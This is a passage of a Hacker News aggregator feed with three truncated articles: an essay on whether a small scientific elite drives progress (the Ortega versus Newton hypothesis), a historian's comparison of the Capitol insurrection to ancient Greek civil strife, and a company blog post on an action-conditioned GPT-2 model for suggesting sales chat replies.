<p>“But when it comes to theoretical physics, we are not talking about much money at all. Suppose that an agency or foundation decided to fully support <strong>all the visionaries</strong> who ignore the mainstream and follow their own ambitious programs to solve the problems of quantum gravity and quantum theory. <strong>We are talking about perhaps</strong> <strong>two dozen theorists</strong>. Supporting them fully would take a tiny fraction of any large nation’s budget for physics.”</p>
</blockquote>
<p>I think there is something to this view, and it is not incompatible with what I said in my last blogpost (That peer review can select the best work). In physics, there has been <a href="https://nintil.com/is-useful-physics-over/">no progress</a> in the <a href="https://www.amazon.com/Trouble-Physics-String-Theory-Science/dp/061891868X">fundamentals</a> of the <a href="https://www.amazon.com/Lost-Math-Beauty-Physics-Astray/dp/0465094252/ref=tmm_hrd_swatch_0?_encoding=UTF8&amp;qid=1610576984&amp;sr=8-2">field</a> since the 70s, so one could argue that perhaps there are key assumptions that need to be thrown away, that there is a strong need for funding what to many physicists seem obviously wrong. In that case peer review may be stifling progress: physics could benefit from less clever math and more philosophical thought, going back to the mode of thinking of Einstein et al. as Smolin suggests. Braben does not oppose peer review in general, he argues that peer review will systematically underrate those coming up with paradigm-breaking ideas, and most of science is not that.</p>
<p>
[1]. Who are biology's geniuses? Darwin? Biology is probably less of a Kuhnian world than physics is, given that biology has fewer strong assumptions baked in that would have to be overthrown and thus count as a revolution
</p>
<p>In biology, in contrast with physics, whatever the current framework is (if any)<sup><a href="#sidenote-1">1</a></sup>, it continues to be extremely fruitful. If one takes <a href="https://www.nobelprize.org/uploads/2020/10/advanced-chemistryprize2020.pdf">CRISPR</a>, which has been arguably been a case of "good science", one can break it down into:</p>
<ol>
<li>
<p>Noticing that there are suspicious repetitive sequences in certain bacteria</p>
</li>
<li>
<p>Figuring out what those are for</p>
</li>
<li>
<p>Leveraging them into a tool for gene editing</p>
</li>
<li>
<p>Further improving CRISPR (e.g. Prime Editing)</p>
</li>
</ol>
<p>None of these examples of good science (Or perhaps engineering if you count the last 2) are paradigm shifts but without any doubt CRISPR has been highly useful and influential, both in academia, and soon in the clinic.</p>
<p>In <a href="https://d1wqtxts1xzle7.cloudfront.net/30686866/Ineq_Wikipedia.pdf?1361917900=&amp;response-content-disposition=inline%3B+filename%3DOn_the_inequality_of_contributions_to_Wi.pdf&amp;Expires=1610411522&amp;Signature=P7P2cCDnu6yNhrt1L64caVUnkBRb40qvLrCZnROjgKvsSB9IP2MavdPs86gdf6AQYNf0FPLRXnH1K-dza1dQ4mBrvhWyoAUAYMlx%7EMXivPNvU9HK%7En5l59Etl8afosE63Odc9gz5aMsWVEAZTkGfgV3peaiEbk7I%7EQfQGhLsAyvz5JXI5YBJHK8u1EWrDN9xnkgKpXavLnv0-L046CM-BJntNX2sMR6j60Lt1nnZ%7ELGYQtWsn0ixPMxhDoNzNcPRCz7y%7Ef5vUQG7KGqRt-xAG%7EOZAyM78RpSF2mp871PHkbf9w1bnojA-ibc8QlJRGtb00qDEEGLV8qi7Y0bQqimWQ__&amp;Key-Pair-Id=APKAJLOHF5GGSLRBV4ZA">wikipedia</a>, only a small fraction (10%) of the active users do most (90%) of the edits. Is science like this, or even more extreme? <a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0101698">Ioannidis</a> et al. (2014) note there are 15M scientists that published anything in the 1996-2011 period, but only 1% that has published every single year in this period. This smaller 150k-strong group accounts for 40% of all papers and 87% of all papers with &gt;1000 citations.</p>
<p>Nobel Prize winner William Shockley published (<a href="https://ieeexplore.ieee.org/document/4056505">1957</a>) a paper measuring the distribution of productivity in an already high-performing environment: the Los Alamos Scientific Laboratory as well as the Brookhaven National Laboratory. Shockley finds a log-normally distribution of publications and patents: Most scientists publish very little and a progressively smaller count publish increasingly more.</p>
<p>There's the observation of Lotka's law (Yes, it's the same Lotka as in Lotka-Volterra) that says that the relative frequency of authors with a given number of publications follows a power law that scales with the square of the number of articles published; for example out of 100 scientists who publishes at least 1 article, only 1 will publish 10 articles. The precise exponent may vary by discipline (Pao, <a href="https://asistdl.onlinelibrary.wiley.com/doi/abs/10.1002/(SICI)1097-4571(198601)37:1%3C26::AID-ASI4%3E3.0.CO;2-Z">1985</a>), but each one does seem to follow the same pattern: A handful of people publish an overwhelming fraction of all the papers.</p>
<p>We could say "We only remember a handful of scientists that advanced modern physics, so that must imply you only need that handful". Back in the early 20th century, how many physicists did "useful" work that ended up leading to currently accepted and useful knowledge? Sure we remember Einstein, Planck, Hilbert, Lorentz, Mach, Poincaré, and Minkowski. But How many physicists total were there back then? Lotka's paper samples Auerbach's <em><a href="https://archive.org/details/geschichtstafel00auergoog">Geschichtstafeln der Physik</a></em> (1910) which compiles physicists the author considered sufficiently important. The book was published 5 years after Einstein's Annus Mirabilis and he's not yet cited there, Auerbach stops at the year 1900. Turns out there are more physicists than just the famous ones (Perhaps we are biased towards those that worked in one particular area that ended up changing the foundations of physics). For example we have <a href="https://en.wikipedia.org/wiki/Heinrich_Kayser">Heinrich Kayser</a> who did pioneering work on, and coined the expression, "adsorption". I bet you hadn't heard of him before. It wouldn't be enough to just count all the names in the <em>Geschichtstafeln</em> and then try to come up with a total count of physicists; even that book can be undercounting physicists that still contributed (For example, that were cited by the authors mentioned in the book). Fortunately now we have indices with journals and citations so we can truly take something closer to the entire population of scientists and explore in more detail the <em>Ortega hypothesis</em>.</p>

<blockquote>
<p>The Ortega hypothesis predicts that highly-cited papers and medium-cited (or lowly-cited) papers would equally refer to papers with a medium impact. The Newton hypothesis would be supported if the top-level research more frequently cites previously highly-cited work than that medium-level research cites highly-cited work. [From the Bornmann paper cited later]</p>
</blockquote>
<p>Or to state it in a more direct way: <em>Most science does not matter</em>, it is a small circle of elites of today that feeds into a small circle of elites in the future.</p>
<p>Cole &amp; Cole (<a href="https://science.sciencemag.org/content/178/4059/368.abstract">1972</a>) is the seminal examination of this question, which led to an entire literature around whether or not the Ortega hypothesis is true or not. They took the most cited paper from each of 84 physicists and looked at the work they cited. 60% of it was to researchers at "top nine" departments (Which comprise 21% of the entire population of physicists), 43% of citations were to researchers that themselves were highly (&gt;60) cited [in a given period of time], despite those being only 8% of all papers. 70% of citations were to researchers that have one or more honorific awards, despite them being 26% of all physicists.</p>
<p>They also replicated this in a larger sample, taking the top 10 papers most cited in <em>Physical Review</em>, they looked at the work cited by those; so take one of those papers, get all the cited authors, compute their total citations and see if this authors are disproportionately more cited than the average author; and they are. The same is true for not so highly cited papers, leading the authors to conclude that T<em>hese data offer further support for the hypothesis that even the producers of research of limited impact depend predominantly on the work produced by a relatively small elite.</em>. </p>
<blockquote>
<p>It seems, rather, that a relatively small number of physicists produce work that becomes the base for future discoveries in physics. We have found that even papers of relatively minor significance have used to a disproportionate degree the work of the eminent scientists.</p>
</blockquote>
<p>Nobel Prize winners, unsurprisingly are extremely well cited even before they get the award,</p>
<blockquote>
<p>The average number of citations in the 1961 SCI to the work of Nobel laureates (who won the prize in physics between 1955 and 1965) was 58, as compared with an average of 5.5 citations for other scientists. Only 1.08 percent of the quarter of a million scientists who appear in the 1961 SCI received 58 or more citations. We thought it possible that winning the prize might make a scientist more visible and lead to a greater number of postprize citations than the quality of his work warranted. We therefore divided the laureates into two groups: those who won the prize five or fewer years before 1961 and those who won it after that year. The 1957-1961 laureates were cited an average of 42 times in the 1961 SCI; the future prize winners (those winning the prize between 1961 and 1965), an average of 62 times. Since the prospective laureates were more often cited than the actual laureates, we concluded that the larger number of …</p></blockquote></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nintil.com/newton-hypothesis">https://nintil.com/newton-hypothesis</a></em></p>]]>
            </description>
            <link>https://nintil.com/newton-hypothesis</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787745</guid>
            <pubDate>Fri, 15 Jan 2021 06:37:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Insurrections, Ancient and Modern (and Also Meet the Academicats)]]>
            </title>
            <description>
<![CDATA[
Score 29 | Comments 11 (<a href="https://news.ycombinator.com/item?id=25787594">thread link</a>) | @parsecs
<br/>
January 14, 2021 | https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>So this week I want to talk about how what I know a historian influences how I am interpreting what I am going to call the Capitol Insurrection that happened on Wednesday, January 6 instead of taking the week off as I had originally planned. Since that is a really heavy topic, I am also going to do what I was <em>originally </em>planning to do this week,<strong> which was to share pictures of the two adorable little cats the Pedant-Household has adopted.</strong></p>



<p>They are named Oliver and Percival (Oliver after the knight from <em>The Song of Roland</em> and Percival after the knight from Arthurian legends, particularly Chretien de Troyes), and they are super-friendly and also oppose insurrectionists.</p>



<figure><img data-attachment-id="5936" data-permalink="https://acoup.blog/pxl_20210114_215722402/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg" data-orig-size="4032,3024" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3a&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610643442&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;1117&quot;,&quot;shutter_speed&quot;:&quot;0.041667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="pxl_20210114_215722402" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=2048 2048w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Oliver (left) and Percival (right) seen here occupying the Pedant’s <a href="https://acoup.blog/category/fireside/">Fireside Chair</a>.</figcaption></figure>



<p>(Note that I have turned off comments for this post.  I know we all have opinions on this, often very strong opinions that others might find very frustrating.  I don’t particularly want to moderate that discussion and in any event, you are, at this point, much better off (if you are in the United States) <a href="https://youtu.be/KXXYkLa-HHI">Contacting Your Representatives</a> with your opinion, rather than arguing on the internet.)</p>



<p>We already talked, <a href="https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/">back in October</a>, about civil strife – <em>stasis</em> – in Greek communities and about how I thought that the United States has found itself in the early but accelerating stages of <em>stasis</em> as described by ancient Greek writers (I also worked in some Roman examples, but I really think the Greek parallel is more useful, as the fall of the Roman Republic was so heavily influenced by the involvement of the Roman Army; the United States military has played no such role, nor indicated it is interested in doing so.  For now, the civil-military relationship remains relatively healthy).</p>



<p>I’m going to assume you have all of that already, so if you want to go back and look at how I described <em>stasis</em> and what that meant, you may want to do that first.  Instead, I want to move forward and discuss what thinking in terms of <em>stasis</em> means in understanding the Capitol Insurrection and in particular the relevance of that Greek model of <em>stasis</em> in understanding both what has happened and what may need to happen going forward.  Starting with:</p>



<h2>This Was Serious</h2>



<p>While the insurrection was happening and in its immediate aftermath, there was a tendency to focus on the more frivolous, silly parts of it.  And there were truly silly looking things.  And there are still commentators – some deluded, some acting in bad faith – attempting to insist that this wasn’t serious.  <strong>They are wrong; the Capitol Insurrection was deadly serious</strong> both in the very literal sense that <em>people died</em> (which I think seems to be missed in some quarters), but also for what it means.  And, as time has passed and <a href="https://www.washingtonpost.com/dc-md-va/2021/01/14/dc-police-capitol-riot/?arc404=true">more reporting has been done</a> on <a href="https://twitter.com/CalebJHull/status/1348334770103660553">what was happening</a>, it has become increasingly apparent that we were perhaps <em>moments </em>away from mass-casualty events (either where politicians were taken by the mob or where the mob so endangered law enforcement or politicians that lethal force was required that would have left many insurrectionists dead).</p>



<p><strong>No ancient Greek would have had any trouble in understanding what happened on the 6th or that it was a serious attempt</strong> (albeit an incompetent one) <strong>to seize power</strong>.  Having a leader or a political faction move with a mob (often armed, but not always so) to<strong> try to disperse the normal civic assemblies of a Greek <em>polis</em> and occupy their normal meeting place was a standard maneuver to try to seize power during <em>stasis</em></strong>. As Dr. <a href="https://twitter.com/Roelkonijn">Roel Konijnendijk</a>, an ancient Greek history specialist, noted in this <a href="https://www.reddit.com/r/AskHistorians/comments/ks082p/meta_todays_sedition_at_the_united_states_capitol/giexmxe/?utm_source=reddit&amp;utm_medium=web2x&amp;context=3">excellent discussion</a> on the r/AskHistorians reddit (where he posts as Iphikrates), “In the Greek world, most attempts to seize power by force tended to take the same form: the seditious party would contrive an opportunity to gather in arms while their opponents were unarmed and off-guard, and seize control of all public spaces.”</p>



<p><strong>To take merely the examples in Athens</strong>, Cylon (the ‘c’ is hard, so Ki-lon – or if you prefer the Greek, Ku-lon – not Psi-lon) attempted it in 632, trying to seize the Athenian Acropolis with an armed mob (Thuc. 1.126; Hdt. 5.71; Plut. <em>Sol.</em> 12.1-2). Cylon’s effort failed in appropriately tragicomic fashion, with his supporters seeking shelter in the temple of Athena and only coming out with a cord that connected them to the altar and its notional protection (the cord breaks and they are all slain, Plut. <em>Sol</em>. 12).  Peisistratos also did it that way in Athens in 561 (Hdt. 1.59) using handpicked bodyguard that he armed with clubs, rather than spears; I cannot help but note just how many things we saw being used as clubs on the 6th. After the Pesistratids were thrown out, Isagoras attempted (with support from the Spartan king Cleomenes I) to institute an oligarchy the same way, seizing the Acropolis, but failing to take the Athenian <em>agora</em>; the Athenians rallied under the democratic leader Cleisthenes and besieged Cleomenes and Isagoras on the Acropolis (Hdt. 5.72; Arist. <em>Ath. Pol</em>. 20.1-4). Later in 411, the ‘Four Hundred’ would seize power in exactly the same way, arriving with a mob of armed supporters to disperse the Athenian <em>boule</em> – it’s council (Thuc. 8.69).  <strong>That’s four examples of this exact tactic from Athens alone</strong> (Athens was by no means the most <em>stasis</em>-prone ancient state, by the way – that was almost certainly Syracuse).</p>



<p>Moreover, <strong>One thing about coup attempts like this in the ancient world: they all look farcical, unless they work.</strong>  Peisistratos’ band of club-armed bodyguards would have looked terribly silly, except that they succeeded, for a time (put a pin in that, we’ll come back to it).  Peisistratos’ second attempt actually built support with something about as farcical as the <a href="https://www.bbc.com/news/world-us-canada-55606044">Q-Anon Shaman</a>, by riding into Athens on a chariot accompanied by a particularly tall woman dressed as Athena (Hdt. 1.60.2-5); the demonstration was taken by some as a sign of divine support. One assumes many Athenians thought it was laughable (Herodotus certainly does), but it was the precursor to another effort to seize power which also worked, albeit temporarily.</p>



<p>Just because it looks silly doesn’t mean it can’t work.  <strong>This was very serious</strong> and <strong>anyone pretending that ‘censorship’ on Twitter</strong> (a <em>private</em> platform, I thought these folks believed in markets?) <strong>or mean – but true – words from angry politicians is more consequential <em>than the violent attempt to seize the seat of government</em> is either a fool, an enemy, or both</strong> (though I will note that there is a world of difference between ‘fools’ and ‘enemies’ – fools may be persuaded and doing so is essential, see below.  We are all foolish at times; it is the cynics that get my dander up).</p>



<figure><img data-attachment-id="5938" data-permalink="https://acoup.blog/pxl_20210110_223238849-mp_/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg" data-orig-size="4032,3024" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3a&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610299958&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;1919&quot;,&quot;shutter_speed&quot;:&quot;0.066683&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="pxl_20210110_223238849.mp_" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=2048 2048w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Oliver, acting as my loyal research assistant.</figcaption></figure>



<h2>This Is Not Over</h2>



<p>Let’s come back to Peisistratos, because he is instructive here.  Peisistratos tried to make himself tyrant of Athens <em><strong>twice</strong></em> before his third attempt succeeded. We’ve discussed his <strong>first attempt </strong>above (in 561), where Peisistratos attempted to use a club-armed bodyguard to seize the city (Hdt. 1.59); that worked, but he was overthrown in a counter-coup sometime after (Hdt. 1.60.1; this was not immediately though, Herodotus notes that Peisistratos had time to set government affairs, Hdt. 1.59.6).</p>



<p><strong>For the <em>second</em> attempt </strong>in 559, Peisistratos made a key alliance with Megacles – someone we might term an ‘establishment’ figure in the Athenian politics of the day, looking to get the edge on his rivals in the continuing Athenian <em>stasis</em> (Herodotus uses the very word, I should note). He was then brought into the city (the chariot bit above, Hdt. 1.60.2-5) and seized power <em>again</em>, with a mob of his supporters. This effort ends because Peisistratos offends Megacles and once his ally turns on him, he is exiled again (Hdt. 1.61.1-2).</p>



<p>But that wasn’t the end of the matter. Peisistratos, once out of power again used his wealth and support – often foreign support, we are told – to raise an army, hire mercenaries (Argives, Herodotus reports) and rally his supporters before storming back into Athens in 545 (Hdt. 1.16.3-4). Herodotus notes that a great flock of Peisistratos’ partisans from the city swarmed out to support him (this should sound more than a little familiar) and<strong> with that mix of mercenaries and mob he was able to catch the Athenians unprepared</strong> (Hdt. 1.63.1) and scattered them, then used a mix of misinformation (implying he intended no violence, Hdt. 1.63.2) and speed to seize the key parts of the city to keep the Athenians disorganized. And then he murdered or exiled all of his enemies (Hdt. 1.64.3) because that is what tyrants <em>do</em>, whatever they are assuring you about their peaceful intentions ahead of time. People who seize power with violence instead of with votes do not suddenly become pacifists when they win!</p>



<p>I don’t know what form the continuation of the trends that led to the Capitol Insurrection will take, if there will be further attempts at violent disruption in D.C. itself, or if we’ll see a shift to a campaign of domestic terror (something like <a href="https://en.wikipedia.org/wiki/The_Troubles">The Troubles</a>, in terms of the violence committed), or if, as with the Nazis after the failure of the <a href="https://en.wikipedia.org/wiki/Beer_Hall_Putsch">Beer Hall Putsch</a>, the folks who supported this insurrection will focus on trying to use the democratic process to abolish the democratic process.  <strong>But this is not over</strong>.  There is abundant polling evidence that among a minority of Americans (but a plurality or majority of Republicans; we’ll come back to that) support for the lies (that the election was fraudulent, <em><a href="https://factcheck.thedispatch.com/p/fact-check-debunking-donald-trumps">which it wasn’t</a></em>; the liars were <a href="https://beta.documentcloud.org/documents/20423518-trump_case_decision">given plenty of chances to provide any evidence at all</a> for their lies and they didn’t) remains high.  As in 545, a great many Americans still support Peisistratos.  Some smaller subset of them have bought into messianic conspiracy theories like Q-Anon which fairly transparently could lead to considerable violence. <strong> The underlying conditions that made the tyrannical attempt possible still exist</strong>, so we should expect …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/">https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787594</guid>
            <pubDate>Fri, 15 Jan 2021 06:12:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Large language models are wild, but can you control them?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25787553">thread link</a>) | @strin
<br/>
January 14, 2021 | https://cresta.com/blog/action-directed-gpt-2 | <a href="https://web.archive.org/web/*/https://cresta.com/blog/action-directed-gpt-2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>At Cresta, we empower sales and support agents that talk to their customers over chat to become experts on day one. We do that by providing them real-time suggestions about how they should respond to their customers. The suggestions as shown in the image below are fully formed responses that can either be sent directly or after light editing by the agents.</p>
<figure id="attachment_19262" aria-describedby="caption-attachment-19262"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/d3c7caf02b9a1ab5f6701f8ccd10d325078eb4f7/f9016/static/c9c87ceb0c53cb006de480b937669d61/gpt-2.png" alt="" width="619" height="350" srcset="https://d33wubrfki0l68.cloudfront.net/d3c7caf02b9a1ab5f6701f8ccd10d325078eb4f7/f9016/static/c9c87ceb0c53cb006de480b937669d61/gpt-2.png 619w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034053/gpt-2-300x170.png 300w" sizes="(max-width: 619px) 100vw, 619px"><figcaption id="caption-attachment-19262">Agents can choose to respond with these generated suggestions.</figcaption></figure>
<p>By suggesting great responses, we help sales agents sell more and help support agents resolve issues quickly. These suggestions also make agents more efficient by saving them a lot of time from manually typing responses.</p>
<p>With this blog, we would like to share an exciting new machine learning model we designed and deployed in early 2020, to generate these expert suggested responses which have driven improvements in sales conversion for our customers</p>
<p>But before introducing the new model, let’s understand the general problem we are trying to solve by focusing on the domain of sales.</p>
<h2>ML for Sales Conversations</h2>
<p>When a sales representative joins a new company, they spend about 6 months learning the ropes and gaining experience until becoming completely effective in their roles. Traditionally, the agents are coached by a sales leader who would listen to conversations and jump in at the right moment to guide the representative. The sales leader may tell the agent to take actions like “Ask for a sale”, “Discover customer’s needs”, “Greet the customer” etc. In the context of live chat, it’s valuable to have a real-time coach to guide responses.</p>
<p>Cresta’s platform helps to solve this training problem by creating individualized responses for each agent. At appropriate moments in the conversation, sales agents can use these suggestions to answer customer inquiries more quickly and more effectively. Our models analyze the ongoing sales conversation to understand the situation, and then suggest the next best response to say according to the next best action to take.</p>
<h2>Language Models for Dialog</h2>
<p>The problem of generating the next response can be solved by training a language model on a dataset of conversations. When we represent dialog as text, we can train a language model on that text and then ask the language model to generate the probable next response given an in-progress conversation. In practice, we have seen that this method works well as pre-trained language models have become very powerful in the past 2 years. These language models usually generate coherent responses.</p>
<p>But just generating coherent responses is not enough. We also want the system to generate the best response to reach the goal of successfully converting a sale. However, a major problem with such language models is that they are difficult to control. This means that it is hard to ask the model to generate a certain type of response.</p>
<p>Now, for example, imagine Alice and Bob are having a conversation…</p>
<p><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/bcb41bae9d573eb45ecb5663834db24784e8cd1a/0f1e7/static/c6ff145ede3bf02bcce9ee10ebcece3e/gpt-2-1.png" alt="" width="2000" height="996" srcset="https://d33wubrfki0l68.cloudfront.net/bcb41bae9d573eb45ecb5663834db24784e8cd1a/0f1e7/static/c6ff145ede3bf02bcce9ee10ebcece3e/gpt-2-1.png 2000w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-300x149.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-1024x510.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-768x382.png 768w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-1536x765.png 1536w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-1200x598.png 1200w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-1980x986.png 1980w" sizes="(max-width: 2000px) 100vw, 2000px"></p>
<p>All the possible responses by Bob are valid responses that a language model might generate. These responses correspond to different actions that Bob might take. We want to control language models to generate responses that help Bob achieve his goal, whatever that might be.</p>
<h2>Need for Controlling language models</h2>
<p>At Cresta, the language model is trained on the real chats of agents, and we find that different agents respond differently to the same situation. We also find that not every agent in a conversation answers perfectly. All this leads to high variance and noise in the training dataset. Thus from this dataset, the model learns a wide distribution of the next possible responses. Since the trained model is more uncertain about the next response, it becomes hard for the model to generate the best response reliably.</p>
<p>In the field of sales, agents use a call-flow which describes what sequence of actions they ideally need to make to get the sale. The best next action for instance could be to ask to close a sale during an appropriate opportunity. To improve the probability of agents making a successful sale, we also want our models to generate a response according to the best next action in that situation. Certainly, a model that generates text that is all over the place won’t suffice.</p>
<p>With our analysis, we also verified that when agents follow the best sequence of actions, it leads to significantly higher sales as shown in the analysis below.</p>
<figure id="attachment_19258" aria-describedby="caption-attachment-19258"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/9f56b1d58e734c358b3bc279a70a3065ee0db37d/3362f/static/d1eb97d18515af49c082d840a5178c91/gpt-2-2.svg" alt="" width="600" height="371"><figcaption id="caption-attachment-19258">For the chats by expert agents that converted in sales, we see that they largely follow the call-flow. e.d. means edit distance of the real conversation from the call-flow. For example, e.d. of 1 means that the agent deviated by 1 action from the call-flow.</figcaption></figure>
<figure id="attachment_19256" aria-describedby="caption-attachment-19256"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/e9435e03b89fca5e74dba02bc22d9bf142bf13b8/ca507/static/cbc474416957f16a7790ed95e2d180e9/gpt-2-3.svg" alt="" width="600" height="371"><figcaption id="caption-attachment-19256">For the chats by all the agents that did not convert in a sale, we see that they deviate strongly from the call-flow.</figcaption></figure>
<p>Instead of relying on training with a maximum likelihood objective to maximize the probability of the next token in the training corpus [1], we want to generate goal-directed responses following a call-flow that maximizes the business metric of sales conversion.</p>
<p>To solve this problem, we designed a controllable language model called “Action-directed GPT-2.”</p>
<h2>Action Directed GPT-2</h2>
<p>Since we want sales agents to follow a call-flow that defines the best sequence of actions they need to make to make a sale, we also want the suggestions to follow that call-flow.</p>
<p>We break the problem of suggestions following a call-flow into two parts-</p>
<ol>
<li>Predict the next best action.</li>
<li>Generate a good response for that action.</li>
</ol>
<p>A typical classical dialog state tracking system also follows a similar architecture where it uses a dialog policy to predict the next action and then selects the response based on a template. According to our experience, such a system does not work well because the real-world conversations are too complex to model with a finite number of states. Even if we were to model the states correctly, the text generations from a template would seem robotic and would not be contextually adapted to the current conversation. These reasons lead to low usage of such suggestions by the sales agents.</p>
<p>To successfully generate contextually accurate responses that follow the correct next action, we train GPT-2, [2] a large language model, to model the problem as learning the probability of the next response given the current state of the conversation and the next best action. This is represented in the figure below.</p>
<p><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/5f52a28a7ef6881f6510f74ee2e91b0033447833/a26ee/static/ae3a505a7381edcead0e7f4136248f55/gpt-2-4.png" alt="" width="1690" height="836" srcset="https://d33wubrfki0l68.cloudfront.net/5f52a28a7ef6881f6510f74ee2e91b0033447833/a26ee/static/ae3a505a7381edcead0e7f4136248f55/gpt-2-4.png 1690w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034045/gpt-2-4-300x148.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034045/gpt-2-4-1024x507.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034045/gpt-2-4-768x380.png 768w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034045/gpt-2-4-1536x760.png 1536w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034045/gpt-2-4-1200x594.png 1200w" sizes="(max-width: 1690px) 100vw, 1690px"></p>
<h2>Data representation for Action Directed GPT-2 model</h2>
<p>There are multiple possible approaches for feeding the action information to the model. This includes adding an extra embedding layer to GPT2 which learns an action-dependent embedding that represents the action a message performs. Although through experimentation, we discovered that representing actions inline as text resulted in a model that is easier to work with, which also performs very well.</p>
<p>Following is an example of the textual representation on a hypothetical chat with hypothetical actions. Over here, the text in <strong>bold</strong> is the action label for the following message.</p>
